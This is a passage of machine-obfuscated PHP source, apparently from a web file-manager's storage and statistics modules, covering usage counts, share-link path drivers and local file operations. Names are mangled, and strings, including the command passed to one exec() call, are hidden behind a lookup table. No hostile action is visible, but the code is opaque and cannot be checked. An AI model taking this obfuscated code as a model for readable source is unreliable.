$…ŸËí¯ù[$Ö˜ÂÙ•¥[1908]] = 0; } } $õ¢Äõ–È[] = $…ŸËí¯ù; } $âµ§åŸ = $õ¢Äõ–È; } $À£”ã• = array($Ö˜ÂÙ•¥[671] => array($Ö˜ÂÙ•¥[854] => LNG($Ö˜ÂÙ•¥[1923]), $Ö˜ÂÙ•¥[1907] => LNG($Ö˜ÂÙ•¥[1924]), $Ö˜ÂÙ•¥[1908] => LNG($Ö˜ÂÙ•¥[1925])), $Ö˜ÂÙ•¥[1909] => array($Ö˜ÂÙ•¥[852] => LNG($Ö˜ÂÙ•¥[1926]), $Ö˜ÂÙ•¥[1911] => LNG($Ö˜ÂÙ•¥[1927]), $Ö˜ÂÙ•¥[1912] => LNG($Ö˜ÂÙ•¥[1928]), $Ö˜ÂÙ•¥[1913] => LNG($Ö˜ÂÙ•¥[1929]))); $£¯™×î’ = array($Ö˜ÂÙ•¥[671] => $Ö˜ÂÙ•¥[1930], $Ö˜ÂÙ•¥[1909] => $Ö˜ÂÙ•¥[89]); if (empty($âµ§åŸ)) { $øíä¼óú = date($Ö˜ÂÙ•¥[1914], strtotime($Ö˜ÂÙ•¥[1915])); $³ôûÀæ = array($Ö˜ÂÙ•¥[265] => $øíä¼óú); foreach ($À£”ã•[$´ËêÈß] as $ÎÓÜÁ–µ => $‹ËôÙã) { $³ôûÀæ[$ÎÓÜÁ–µ] = 0; } $âµ§åŸ[] = $³ôûÀæ; } $Û—Ü§á = array(); foreach ($âµ§åŸ as $‹ËôÙã) { if ($´ËêÈß == $Ö˜ÂÙ•¥[1909] && $‹ËôÙã[$Ö˜ÂÙ•¥[1911]] > $‹ËôÙã[$Ö˜ÂÙ•¥[852]]) { $‹ËôÙã[$Ö˜ÂÙ•¥[1911]] = $‹ËôÙã[$Ö˜ÂÙ•¥[852]]; } foreach ($À£”ã•[$´ËêÈß] as $ÎÓÜÁ–µ => $»æ¢œÙò) { $…ŸËí¯ù = array($Ö˜ÂÙ•¥[265] => $‹ËôÙã[$Ö˜ÂÙ•¥[265]], $Ö˜ÂÙ•¥[1668] => $»æ¢œÙò); $…ŸËí¯ù[$£¯™×î’[$´ËêÈß]] = isset($‹ËôÙã[$ÎÓÜÁ–µ]) ? $‹ËôÙã[$ÎÓÜÁ–µ] : 0; $Û—Ü§á[] = $…ŸËí¯ù; } } return $Û—Ü§á; } public function validDate($ş¿ƒÏâ©, $ØÍáëè) { $İ„ï¤†® =& $_SERVER[÷ôÚîå]; $æÎøó‡§ = date($İ„ï¤†®[1914], strtotime($İ„ï¤†®[1915])); $¦Ş®³Ã = array($æÎøó‡§); switch ($ş¿ƒÏâ©) { case $İ„ï¤†®[1759]: $ùğº”¢Â = mktime(0, 0, 0, date($İ„ï¤†®[1931]), date($İ„ï¤†®[1460]) - date($İ„ï¤†®[1550]) + 7 - 7, date($İ„ï¤†®[1932])); $Ã§£ğÁ› = 0; do { $™Ã·ù§³ = date($İ„ï¤†®[1914], $ùğº”¢Â - 3600 * 24 * 7 * $Ã§£ğÁ›); $¦Ş®³Ã[] = $™Ã·ù§³; $Ã§£ğÁ›++; } while ($ØÍáëè < $™Ã·ù§³); break; case $İ„ï¤†®[1757]: $Ã§£ğÁ› = 1; do { $Çê‚Ë™æ = date($İ„ï¤†®[1933], strtotime("\55\40{$Ã§£ğÁ›}\40\x6d\x6f\x6e\164\150\163")); $¦Ş®³Ã[] = $Çê‚Ë™æ; $Ã§£ğÁ›++; } while ($ØÍáëè < $Çê‚Ë™æ); break; case $İ„ï¤†®[1934]: $öãİÑ = (int) date($İ„ï¤†®[1932], strtotime($ØÍáëè)); $‚Ûú†é = (int) date($İ„ï¤†®[1932]); if ($öãİÑ >= $‚Ûú†é) { break; } for ($öãİÑ; $öãİÑ < $‚Ûú†é; $öãİÑ++) { $¦Ş®³Ã[] = $öãİÑ . $İ„ï¤†®[1935]; } break; default: break; } if ($ØÍáëè > end($¦Ş®³Ã)) { array_pop($¦Ş®³Ã); } sort($¦Ş®³Ã); return $¦Ş®³Ã; } public function listTable($ÅÚŸğ¥Û) { $Í‰®¾À = ucfirst($ÅÚŸğ¥Û); return Model($Í‰®¾À)->listData(); } public function option($¯ËË¯ÒÉ) { $÷Íë ø = $_SERVER[÷ôÚîå][1936] . ucfirst($¯ËË¯ÒÉ); return $this->{$÷Íë ø}(); } private function optionUser() { $¡ÀÕ»û =& $_SERVER[÷ôÚîå]; $‰ğìÙëÛ = Model($¡ÀÕ»û[607])->count($¡ÀÕ»û[1779]); $ñÆ¨Ÿê‘ = Model($¡ÀÕ»û[607])->where($¡ÀÕ»û[1937])->count($¡ÀÕ»û[1779]); $±Š¾‰ØÄ = intval($GLOBALS[$¡ÀÕ»û[6]][$¡ÀÕ»û[434]][$¡ÀÕ»û[1725]]) / 3600; $çÑ™‘À = strtotime("\x2d{$±Š¾‰ØÄ}\x20\150\x6f\165\x72\163"); $ˆ½­ò¯ö = strtotime(date($¡ÀÕ»û[1918])); if ($çÑ™‘À < $ˆ½­ò¯ö) { $çÑ™‘À = $ˆ½­ò¯ö; } $”şú•£ê = array($¡ÀÕ»û[1938] => array($¡ÀÕ»û[1103], $çÑ™‘À)); $ÒÑ·šÖ  = (int) Model($¡ÀÕ»û[607])->where($”şú•£ê)->count($¡ÀÕ»û[1779]); if (!$ÒÑ·šÖ ) { $ÒÑ·šÖ  = 1; } $”şú•£ê = array($¡ÀÕ»û[1938] => array($¡ÀÕ»û[1103], $ˆ½­ò¯ö)); $ñæ…ˆøê = Model($¡ÀÕ»û[607])->where($”şú•£ê)->count($¡ÀÕ»û[1779]); return array($¡ÀÕ»û[847] => (int) $‰ğìÙëÛ, $¡ÀÕ»û[1939] => (int) ($‰ğìÙëÛ - $ñÆ¨Ÿê‘), $¡ÀÕ»û[1940] => (int) $ñÆ¨Ÿê‘, $¡ÀÕ»û[1941] => (int) $ñæ…ˆøê, $¡ÀÕ»û[1942] => $ÒÑ·šÖ ); } private function optionFile() { $ÚÏó¨Ê =& $_SERVER[÷ôÚîå]; $œ¼âÇµ¼ = $this->sourceSize(); $Ü¶ø×Šä = $œ¼âÇµ¼[$ÚÏó¨Ê[89]]; $şöªñî­ = $œ¼âÇµ¼[$ÚÏó¨Ê[1911]]; $ÙœÈÍ› = Model($ÚÏó¨Ê[914])->where(array($ÚÏó¨Ê[494] => 0))->count($ÚÏó¨Ê[203]); $›‰ƒÅå‹ = array($ÚÏó¨Ê[494] => 0, $ÚÏó¨Ê[241] => array($ÚÏó¨Ê[1103], strtotime(date($ÚÏó¨Ê[1918])))); $›Ğâòï = Model($ÚÏó¨Ê[914])->where($›‰ƒÅå‹)->sum($ÚÏó¨Ê[89]); $¯‡êòöû = Model($ÚÏó¨Ê[914])->where($›‰ƒÅå‹)->count($ÚÏó¨Ê[203]); return array($ÚÏó¨Ê[852] => $Ü¶ø×Šä, $ÚÏó¨Ê[1911] => $şöªñî­, $ÚÏó¨Ê[1943] => $Ü¶ø×Šä - $şöªñî­, $ÚÏó¨Ê[1944] => (int) $›Ğâòï, $ÚÏó¨Ê[854] => (int) $ÙœÈÍ›, $ÚÏó¨Ê[1945] => (int) $¯‡êòöû); } private function optionAccess() { $ˆ¦ô½Ùİ =& $_SERVER[÷ôÚîå]; return array($ˆ¦ô½Ùİ[847] => $this->typeLogCnt(), $ˆ¦ô½Ùİ[120] => $this->typeLogCnt($ˆ¦ô½Ùİ[120]), $ˆ¦ô½Ùİ[534] => $this->typeLogCnt($ˆ¦ô½Ùİ[534]), $ˆ¦ô½Ùİ[1946] => $this->typeLogCnt($ˆ¦ô½Ùİ[1946]), $ˆ¦ô½Ùİ[1947] => $this->typeLogCnt($ˆ¦ô½Ùİ[1947]), $ˆ¦ô½Ùİ[671] => $this->typeLogCnt($ˆ¦ô½Ùİ[12], $ˆ¦ô½Ùİ[1922])); } private function typeLogCnt($˜Á¿¼Õ = '', $Ä»ÎÙĞ˜ = "\151\144") { $·¼„«ö® =& $_SERVER[÷ôÚîå]; $ëß¹óÃ” = array($·¼„«ö®[120] => array($·¼„«ö®[1948], $·¼„«ö®[1949]), $·¼„«ö®[534] => array($·¼„«ö®[1950], $·¼„«ö®[1951]), $·¼„«ö®[1946] => array($·¼„«ö®[1952], $·¼„«ö®[1953], $·¼„«ö®[1954]), $·¼„«ö®[1947] => array($·¼„«ö®[1955], $·¼„«ö®[1956]), $·¼„«ö®[1957] => array($·¼„«ö®[1958], $·¼„«ö®[1959], $·¼„«ö®[1960])); $®Ğúıœ‘ = strtotime(date($·¼„«ö®[1918])); $³ÉÛ® = array($·¼„«ö®[241] => array($·¼„«ö®[1103], $®Ğúıœ‘)); if ($˜Á¿¼Õ) { $³ÉÛ®[$·¼„«ö®[33]] = array($·¼„«ö®[7], $ëß¹óÃ”[$˜Á¿¼Õ]); } $ûšõú²Õ = Model($·¼„«ö®[1921])->where($³ÉÛ®)->count($Ä»ÎÙĞ˜); return (int) $ûšõú²Õ; } private function optionServer() { $ó¾ª“°¬ =& $_SERVER[÷ôÚîå]; $ê‡“§ğ = $this->diskDriver(); $ŒÜşåÚ = KodIO::defaultDriver(); $èÊ®Ø›Å = array($ó¾ª“°¬[907] => $ŒÜşåÚ[$ó¾ª“°¬[484]]); $ë‰ùšÀ¹ = Model($ó¾ª“°¬[553])->where($èÊ®Ø›Å)->sum($ó¾ª“°¬[89]); $×çê¡å• = explode($ó¾ª“°¬[53], $_SERVER[$ó¾ª“°¬[157]]); $†¡»½öà = $×çê¡å•[0]; $í˜ú Üû = $GLOBALS[$ó¾ª“°¬[6]][$ó¾ª“°¬[21]]; $®ŸØÊé¶ = $í˜ú Üû[$ó¾ª“°¬[1065]]; if ($®ŸØÊé¶ == $ó¾ª“°¬[1053]) { $èúÄ£º = explode($ó¾ª“°¬[1379], $í˜ú Üû[$ó¾ª“°¬[1064]]); $®ŸØÊé¶ = $èúÄ£º[0]; } if ($®ŸØÊé¶ == $ó¾ª“°¬[1001] || $®ŸØÊé¶ == $ó¾ª“°¬[894]) { $Û±»×¥Å = Model()->db()->query($ó¾ª“°¬[1961]); $¥˜Ïªòê = $Û±»×¥Å[0] && isset($Û±»×¥Å[0][$ó¾ª“°¬[1667]]) ? $Û±»×¥Å[0][$ó¾ª“°¬[1667]] : 0; $®ŸØÊé¶ = $ó¾ª“°¬[1962] . ($¥˜Ïªòê ? $ó¾ª“°¬[8] . $¥˜Ïªòê : $ó¾ª“°¬[12]); } $ù¸× ² = $GLOBALS[$ó¾ª“°¬[6]][$ó¾ª“°¬[434]][$ó¾ª“°¬[916]]; return array($ó¾ª“°¬[1963] => $ê‡“§ğ ? $ê‡“§ğ[$ó¾ª“°¬[1964]] : 0, $ó¾ª“°¬[1965] => $ê‡“§ğ ? $ê‡“§ğ[$ó¾ª“°¬[1966]] : 0, $ó¾ª“°¬[1967] => (int) $ŒÜşåÚ[$ó¾ª“°¬[1964]] * 1024 * 1024 * 1024, $ó¾ª“°¬[1968] => (int) $ë‰ùšÀ¹, $ó¾ª“°¬[1969] => ucfirst($†¡»½öà), $ó¾ª“°¬[1970] => $ó¾ª“°¬[1971] . PHP_VERSION, $ó¾ª“°¬[1972] => phpBuild64() ? 64 : 32, $ó¾ª“°¬[846] => str_replace($ó¾ª“°¬[1222], $ó¾ª“°¬[1081], $®ŸØÊé¶), $ó¾ª“°¬[434] => ucfirst($ù¸× ²), $ó¾ª“°¬[32] => $_SERVER[$ó¾ª“°¬[1973]]); } private function diskDriver() { $Õ­ÒŞìÄ =& $_SERVER[÷ôÚîå]; $ÁØíÏ¡ = $Õ­ÒŞìÄ[8]; $š¾Š‚³Ø = $GLOBALS[$Õ­ÒŞìÄ[6]][$Õ­ÒŞìÄ[1396]] == $Õ­ÒŞìÄ[1397]; if ($š¾Š‚³Ø) { $ÁØíÏ¡ = $Õ­ÒŞìÄ[1974]; if (function_exists($Õ­ÒŞìÄ[1975])) { exec($Õ­ÒŞìÄ[1976], $–©ÂÄÓ); $ÁØíÏ¡ = $–©ÂÄÓ[1] . $Õ­ÒŞìÄ[8]; } } if (!file_exists($ÁØíÏ¡)) { return; } if (!function_exists($Õ­ÒŞìÄ[1977])) { return; } $¶ŒàÕùØ = @disk_total_space($ÁØíÏ¡); $ í–É„‘ = $¶ŒàÕùØ - @disk_free_space($ÁØíÏ¡); return array($Õ­ÒŞìÄ[1964] => $¶ŒàÕùØ, $Õ­ÒŞìÄ[1966] => $ í–É„‘); } public function fileChart($èåé‹Ñ¹) { $ëğàÁ™í =& $_SERVER[÷ôÚîå]; if (isset($èåé‹Ñ¹[$ëğàÁ™í[1779]])) { return Model($ëğàÁ™í[914])->userFileTypeProfile($èåé‹Ñ¹[$ëğàÁ™í[1779]]); } if (isset($èåé‹Ñ¹[$ëğàÁ™í[1978]])) { return Model($ëğàÁ™í[914])->groupFileTypeProfile($èåé‹Ñ¹[$ëğàÁ™í[1978]]); } $¶‡ú¯÷© = $this->sourceSize(); $ËÊ…îÀ = array($ëğàÁ™í[202] => 0, $ëğàÁ™í[200] => 1); $ôœ–š = Model($ëğàÁ™í[914])->where($ËÊ…îÀ)->sum($ëğàÁ™í[89]); $ËÊ…îÀ[$ëğàÁ™í[200]] = 2; $üîáÖµ¼ = Model($ëğàÁ™í[914])->where($ËÊ…îÀ)->sum($ëğàÁ™í[89]); return array($ëğàÁ™í[852] => $¶‡ú¯÷©[$ëğàÁ™í[89]], $ëğàÁ™í[1911] => $¶‡ú¯÷©[$ëğàÁ™í[1911]], $ëğàÁ™í[1912] => (int) $ôœ–š, $ëğàÁ™í[1913] => (int) $üîáÖµ¼); } private function sourceSize() { $Ó’–û²º =& $_SERVER[÷ôÚîå]; $ÊÉŞÈÁÁ = Model($Ó’–û²º[914])->where(array($Ó’–û²º[494] => 0))->sum($Ó’–û²º[89]); $¢½áÅ±¥ = Model($Ó’–û²º[553])->sum($Ó’–û²º[89]); if ($¢½áÅ±¥ > $ÊÉŞÈÁÁ) { $¢½áÅ±¥ = $ÊÉŞÈÁÁ; } return array($Ó’–û²º[89] => (int) $ÊÉŞÈÁÁ, $Ó’–û²º[1911] => (int) $¢½áÅ±¥); } } goto F‚ŸÆ½Ì¨‚; bÄ´Â×”ƒÔ: class PathDriverDbShareLink extends PathDriverDB { public function __construct($ÛìĞ÷ú) { $this->pathParse = $ÛìĞ÷ú; $this->model = Model($_SERVER[÷ôÚîå][1429]); } protected function infoParse($‘½š«¶, $Çüğ‹Èé = false, $ÑíÉö–Ñ = false) { $ÒÃ˜òŠÑ =& $_SERVER[÷ôÚîå]; return Action($ÒÃ˜òŠÑ[1267])->sharePathInfo($this->pathParse[$ÒÃ˜òŠÑ[97]], !0, $Çüğ‹Èé); } public function listPath($«‚Ìí¤›, $ûœÑÕ©¤ = false) { $â•Á†Õ =& $_SERVER[÷ôÚîå]; $†ù›İ¾£ = parent::listPath($«‚Ìí¤›, $ûœÑÕ©¤); if (!$†ù›İ¾£) { return $†ù›İ¾£; } if (is_array($†ù›İ¾£[$â•Á†Õ[1437]])) { $†ù›İ¾£[$â•Á†Õ[1437]] = Action($â•Á†Õ[1267])->shareItemInfo($†ù›İ¾£[$â•Á†Õ[1437]]); } foreach ($†ù›İ¾£ as $ñğğ™° => $Ï¸Æ˜ë–) { if (!in_array($ñğğ™°, array($â•Á†Õ[96], $â•Á†Õ[95]))) { continue; } foreach ($Ï¸Æ˜ë– as $ùºÌ¾Õ => $ºÚ¦†Àü) { $†ù›İ¾£[$ñğğ™°][$ùºÌ¾Õ] = Action($â•Á†Õ[1267])->shareItemInfo($ºÚ¦†Àü); } } return $†ù›İ¾£; } public function listAll($Ê€ëùŞ) { $›ßü™Í” =& $_SERVER[÷ôÚîå]; $×´²Ñ = IO::info($this->pathParse[$›ßü™Í”[97]]); if (!$×´²Ñ) { return array(); } $ß–‡²õ» = $this->model->listAll($Ê€ëùŞ); foreach ($ß–‡²õ» as &$¯Å ¾©û) { $¯Å ¾©û[$›ßü™Í”[100]] = Action($›ßü™Í”[1267])->shareItemInfo($¯Å ¾©û[$›ßü™Í”[100]]); } unset($¯Å ¾©û); return $ß–‡²õ»; } } class PathDriverDriverShareItem { public function __construct($ÄÜ©şæÊ) { $this->pathParse = $ÄÜ©şæÊ; } public function __call($øˆáº“Ï, $ùÇé‚ä) { $©ÁÑÄ‰ =& $_SERVER[÷ôÚîå]; if (method_exists($this, $øˆáº“Ï)) { return; } $–Œµå´Æ = call_user_func_array(array($©ÁÑÄ‰[1438], $øˆáº“Ï), $ùÇé‚ä); $Ø•µäëû = array($©ÁÑÄ‰[1439], $©ÁÑÄ‰[1440], $©ÁÑÄ‰[1441], $©ÁÑÄ‰[1442], $©ÁÑÄ‰[627], $©ÁÑÄ‰[629], $©ÁÑÄ‰[1443], $©ÁÑÄ‰[120], $©ÁÑÄ‰[1444], $©ÁÑÄ‰[1445]); if (in_array($øˆáº“Ï, $Ø•µäëû)) { $–Œµå´Æ = $this->getPathOuter($–Œµå´Æ); } return $–Œµå´Æ; } public function copy($³Ğ×À§È, $¬‚„¿¥Ç, $ù‹âÓô = false, $¿æñè = false) { return $this->copyMove($³Ğ×À§È, $¬‚„¿¥Ç, $ù‹âÓô, $_SERVER[÷ôÚîå][627], $¿æñè); } public function move($Ìïãéêë, $œã–ø“…, $œ×Ã•Ÿ¡ = false, $ÏğçÇòÂ = false) { return $this->copyMove($Ìïãéêë, $œã–ø“…, $œ×Ã•Ÿ¡, $_SERVER[÷ôÚîå][629], $ÏğçÇòÂ); } private function copyMove($ŞôÃâƒŒ, $–ºº•Õ, $µÖÈ’´³, $¾¹ê×Â¸, $ĞÙ”æ¨Ì = false) { $Š„ª„‚ =& $_SERVER[÷ôÚîå]; $ØøŞ¯×– = $–ºº•Õ; $ÈŠü–¾– = IO::driverMake($–ºº•Õ); if ($ÈŠü–¾–->pathParse[$Š„ª„‚[1243]]) { $–ºº•Õ = $ÈŠü–¾–->pathParse[$Š„ª„‚[1243]]; } else { $–ºº•Õ = $ØøŞ¯×–; } $ó­©üí = IO::copyMove($ŞôÃâƒŒ, $–ºº•Õ, $µÖÈ’´³, $¾¹ê×Â¸, $ĞÙ”æ¨Ì); $ó­©üí = $this->getPathOuter($ó­©üí); return $ó­©üí; } public function pathThis($–øùõ˜º) { return get_path_this($this->pathParse[$_SERVER[÷ôÚîå][97]]); } public function pathFather($îİ±Ü“) { return get_path_father($this->pathParse[$_SERVER[÷ôÚîå][97]]); } public function iconvSystem($‚­‰´â¦) { return $‚­‰´â¦; } protected function infoParse($Äš¶›­ú, $˜¸áñÛå = false) { $Òó‚®¨ó =& $_SERVER[÷ôÚîå]; $‹£¹Á = $this->pathParse[$Òó‚®¨ó[569]][$Òó‚®¨ó[1268]] . $this->pathParse[$Òó‚®¨ó[1261]]; if ($˜¸áñÛå) { $Í™ş¿ÆË = IO::infoWithChildren($‹£¹Á); } else { $Í™ş¿ÆË = IO::info($‹£¹Á); } $õÑü°ı = $this->pathParse[$Òó‚®¨ó[569]]; return Action($Òó‚®¨ó[1436])->_shareItemeParse($Í™ş¿ÆË, $õÑü°ı); } public function listAll($˜ª©Í¶) { $Ê€ìã„ =& $_SERVER[÷ôÚîå]; $èÛäøéŞ = IO::listAll($˜ª©Í¶); $¨Åë…¡ = rtrim($this->pathParse[$Ê€ìã„[569]][$Ê€ìã„[1268]], $Ê€ìã„[8]); foreach ($èÛäøéŞ as &$ÏöÌ©‹) { $ÏöÌ©‹[$Ê€ìã„[97]] = $this->pathDriver . $Ê€ìã„[8] . ltrim(substr($ÏöÌ©‹[$Ê€ìã„[97]], strlen($¨Åë…¡)), $Ê€ìã„[8]); } unset($ÏöÌ©‹); return $èÛäøéŞ; } public function listAllSimple($šÜ¯ èª, $Ó£Ş¹¥Ü = false) { $³Àá¥òÔ =& $_SERVER[÷ôÚîå]; $¯‰ÎşÄ = $this->listAll($šÜ¯ èª); $ÎÈ·œ“‘ = $this->pathParse[$³Àá¥òÔ[504]]; if (trim($ÎÈ·œ“‘, $³Àá¥òÔ[8]) == trim(get_path_father($ÎÈ·œ“‘), $³Àá¥òÔ[8])) { $Ó£Ş¹¥Ü = !0; } return IO::init($³Àá¥òÔ[12])->listAllSimpleMake($¯‰ÎşÄ, $ÎÈ·œ“‘, $Ó£Ş¹¥Ü); } public function getPathOuter($æï‹½Ô) { $†—ş¥’ =& $_SERVER[÷ôÚîå]; $ÑÌ½ò” = KodIO::parse($æï‹½Ô); if ($ÑÌ½ò”[$†—ş¥’[33]] == KodIO::KOD_SHARE_ITEM) { return $ÑÌ½ò”[$†—ş¥’[97]]; } $Şİ¶–å = KodIO::clear($æï‹½Ô); $Ö‰é¬Š© = KodIO::clear($this->pathParse[$†—ş¥’[569]][$†—ş¥’[1268]]); $ÀôåÃÅÂ = substr($Şİ¶–å, strlen($Ö‰é¬Š©)); if (substr($Şİ¶–å, 0, strlen($Ö‰é¬Š©)) != $Ö‰é¬Š©) { return !1; } return $this->pathParse[$†—ş¥’[1262]] . $†—ş¥’[8] . ltrim($ÀôåÃÅÂ, $†—ş¥’[8]); } public function getType() { $Ï•†’ =& $_SERVER[÷ôÚîå]; $Ùœ•ŒØ‰ = str_replace($Ï•†’[87], $Ï•†’[12], get_class($this)); return strtolower($Ùœ•ŒØ‰); } public function isOsDriver($çü”Ã„) { return IO::isOsDriver($çü”Ã„); } public function info($‡¶¦Âñ) { return $this->infoParse($‡¶¦Âñ); } public function infoAuth($ùê¹°’ö) { return $this->infoParse($ùê¹°’ö); } public function infoWithChildren($ë§ˆÁÚ) { return $this->infoParse($ë§ˆÁÚ, !0); } public function infoFull($Š€Ç˜øƒ) { return $this->infoParse($Š€Ç˜øƒ); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($Ş¯ÓÇ§) { $this->pathParse = $Ş¯ÓÇ§; } protected function infoParse($ÚĞ‰ÙË, $£½¦øì = false) { $œ¿´€ş =& $_SERVER[÷ôÚîå]; return Action($œ¿´€ş[1267])->sharePathInfo($this->pathParse[$œ¿´€ş[97]], !0, $£½¦øì); } public function listPath($Ê¿Ô…¹ç, $Ù†ç¹À‘ = false) { $’„À½Äç =& $_SERVER[÷ôÚîå]; $†íÛŞÜ˜ = IO::listPath($Ê¿Ô…¹ç, $Ù†ç¹À‘); if (!$†íÛŞÜ˜) { return $†íÛŞÜ˜; } if (is_array($†íÛŞÜ˜[$’„À½Äç[1437]])) { $Ó€í€¥ = Action($’„À½Äç[1446])->parsePathChildren($†íÛŞÜ˜[$’„À½Äç[1437]], array($’„À½Äç[504] => $Ê¿Ô…¹ç)); $†íÛŞÜ˜[$’„À½Äç[1437]] = Action($’„À½Äç[1267])->shareItemInfo($Ó€í€¥); } foreach ($†íÛŞÜ˜ as $±û§˜Í‡ => $Â½‘Á ¿) { if (!in_array($±û§˜Í‡, array($’„À½Äç[96], $’„À½Äç[95]))) { continue; } foreach ($Â½‘Á ¿ as $óÓ¹¾È½ => $Ó€í€¥) { $Ó€í€¥ = Action($’„À½Äç[1446])->parsePathChildren($Ó€í€¥, array($’„À½Äç[504] => $Ê¿Ô…¹ç)); $†íÛŞÜ˜[$±û§˜Í‡][$óÓ¹¾È½] = Action($’„À½Äç[1267])->shareItemInfo($Ó€í€¥); } } return $†íÛŞÜ˜; } } goto b†„§ö‘Ê; Då•Ä¶Ş: class PathDriverJOS extends PathDriverBaseS3 { public function __construct($ÖˆÍÉöñ) { parent::__construct($ÖˆÍÉöñ); $this->setSignVersion($_SERVER[÷ôÚîå][257]); } public function uploadLink($µ¤ƒœ , $˜‹Ô×ê€ = 0) { $ŒÇÊ¿ æ =& $_SERVER[÷ôÚîå]; if ($this->isUploadServer()) { return; } $õö†Ä…Ä = $this->getType(); if (!in_array($õö†Ä…Ä, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $»›ÁÓ¥Ÿ = (!$˜‹Ô×ê€ ? 1 : ceil($˜‹Ô×ê€ / pow(1024, 3))) * 3600 * 4; $Î¨€À« = $this->multiUploadFormData($µ¤ƒœ , $»›ÁÓ¥Ÿ); if ($Î¨€À«) { $Î¨€À«[$ŒÇÊ¿ æ[107]] = $µ¤ƒœ ; $Î¨€À«[$ŒÇÊ¿ æ[108]] = $õö†Ä…Ä; } return $Î¨€À«; } public function fileOutImage($®‡âíƒâ, $¾ùƒíß± = 250) { if ($this->size($®‡âíƒâ) > 1024 * 1024 * 25) { return $this->fileOutImageServer($®‡âíƒâ, $¾ùƒíß±); } $Ë×Æà¿ = $this->link($®‡âíƒâ); $Ë×Æà¿ .= $_SERVER[÷ôÚîå][1462] . $¾ùƒíß±; $this->fileOutLink($Ë×Æà¿); } public function fileOutLink($ëÑÅì‰´) { $®Íó¼» =& $_SERVER[÷ôÚîå]; if (substr($ëÑÅì‰´, 0, 7) == $®Íó¼»[322]) { $ëÑÅì‰´ = $®Íó¼»[323] . substr($ëÑÅì‰´, 7); } header($®Íó¼»[185] . $ëÑÅì‰´); die; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($öÙşÑĞ…) { if (substr($öÙşÑĞ…, 0, 2) == $_SERVER[÷ôÚîå][1421]) { $öÙşÑĞ… = BASIC_PATH . substr($öÙşÑĞ…, 2); } return $öÙşÑĞ…; } public function iconvApp($±¨ù…û÷) { $·ÚÆó—Ã =& $_SERVER[÷ôÚîå]; global $config; return $this->iconvTo($±¨ù…û÷, $config[$·ÚÆó—Ã[1448]], $config[$·ÚÆó—Ã[1447]]); } public function iconvSystem($åùìëàû) { $ûö·¿ŞÇ =& $_SERVER[÷ôÚîå]; global $config; return $this->iconvTo($åùìëàû, $config[$ûö·¿ŞÇ[1447]], $config[$ûö·¿ŞÇ[1448]]); } public function getPathOuter($üüÚÁ‹¸) { $•¥ƒğÀ— =& $_SERVER[÷ôÚîå]; $°‰ÈşåÜ = $this->iconvApp($this->pathBase); $üüÚÁ‹¸ = $this->iconvApp($üüÚÁ‹¸); if (substr($°‰ÈşåÜ, 0, 2) == $•¥ƒğÀ—[1421]) { $°‰ÈşåÜ = BASIC_PATH . substr($°‰ÈşåÜ, 2); } if (substr($üüÚÁ‹¸, 0, 2) == $•¥ƒğÀ—[1421]) { $üüÚÁ‹¸ = BASIC_PATH . substr($üüÚÁ‹¸, 2); } $°‰ÈşåÜ = KodIO::clear($°‰ÈşåÜ); $üüÚÁ‹¸ = KodIO::clear($üüÚÁ‹¸); $üüÚÁ‹¸ = substr($üüÚÁ‹¸, strlen($°‰ÈşåÜ)); if (empty($this->pathDriver)) { return $üüÚÁ‹¸; } return $this->pathDriver . $•¥ƒğÀ—[8] . ltrim($üüÚÁ‹¸, $•¥ƒğÀ—[8]); } public function mkfile($ÄÒ·óÂ, $ñÂêŞß = '', $³®„‹§ = REPEAT_RENAME) { $ÄÒ·óÂ = $this->iconvSystem($ÄÒ·óÂ); @touch($ÄÒ·óÂ); if ($ñÂêŞß) { file_put_contents($ÄÒ·óÂ, $ñÂêŞß); } @chmod($ÄÒ·óÂ, $this->pathAuth); if (is_file($ÄÒ·óÂ)) { return $this->getPathOuter($ÄÒ·óÂ); } $this->writeLog(__FUNCTION__ . $_SERVER[÷ôÚîå][1459], !0); return !1; } public function mkdir($†’Õ—Š, $¶¿§Òé = REPEAT_SKIP) { $†’Õ—Š = $this->iconvSystem($†’Õ—Š); if (is_dir($†’Õ—Š)) { return $this->getPathOuter($†’Õ—Š); } @mkdir($†’Õ—Š, $this->pathAuth, !0); @chmod($†’Õ—Š, $this->pathAuth); if (is_dir($†’Õ—Š)) { return $this->getPathOuter($†’Õ—Š); } $this->writeLog(__FUNCTION__ . $_SERVER[÷ôÚîå][1459], !0); return !1; } public function copyFile($£šÙõê, $÷ØÊŠ») { $this->mkdir($this->pathFather($÷ØÊŠ»)); $£šÙõê = $this->iconvSystem($£šÙõê); $÷ØÊŠ» = $this->iconvSystem($÷ØÊŠ»); $¹é©î½ = copy_64($£šÙõê, $÷ØÊŠ»); @chmod($÷ØÊŠ», $this->pathAuth); if ($¹é©î½) { return $this->getPathOuter($÷ØÊŠ»); } $this->writeLog(__FUNCTION__ . $_SERVER[÷ôÚîå][1459], !0); return !1; } public function moveFile($ï†¹Ø…‘, $—’æ¶ù©) { $this->mkdir($this->pathFather($—’æ¶ù©)); $ï†¹Ø…‘ = $this->iconvSystem($ï†¹Ø…‘); $—’æ¶ù© = $this->iconvSystem($—’æ¶ù©); $Á¤ïÆÊ = intval(@rename($ï†¹Ø…‘, $—’æ¶ù©)); if (!$Á¤ïÆÊ) { if ($Á¤ïÆÊ = intval(@copy_64($ï†¹Ø…‘, $—’æ¶ù©))) { @unlink($ï†¹Ø…‘); } } @chmod($—’æ¶ù©, $this->pathAuth); if ($Á¤ïÆÊ) { return $this->getPathOuter($—’æ¶ù©); } $this->writeLog(__FUNCTION__ . $_SERVER[÷ôÚîå][1459], !0); return !1; } public function movePath($¦»¥£Î·, $ÀŸÂá…ö, $¡Õ˜úØí = false) { $ıÛ‘í“€ =& $_SERVER[÷ôÚîå]; $¦»¥£Î· = $this->iconvSystem($¦»¥£Î·); $ÀŸÂá…ö = $this->iconvSystem($ÀŸÂá…ö); $Ï¨°³­® = rtrim($ÀŸÂá…ö, $ıÛ‘í“€[8]) . $ıÛ‘í“€[8] . ($¡Õ˜úØí ? $¡Õ˜úØí : get_path_this($¦»¥£Î·)); if (file_exists($Ï¨°³­®)) { return !1; } $¶¸ÂÎ·¥ = intval(@rename($¦»¥£Î·, $Ï¨°³­®)); $¶¸ÂÎ·¥ = file_exists($Ï¨°³­®); if ($¶¸ÂÎ·¥) { return $this->getPathOuter($Ï¨°³­®); } $this->writeLog(__FUNCTION__ . 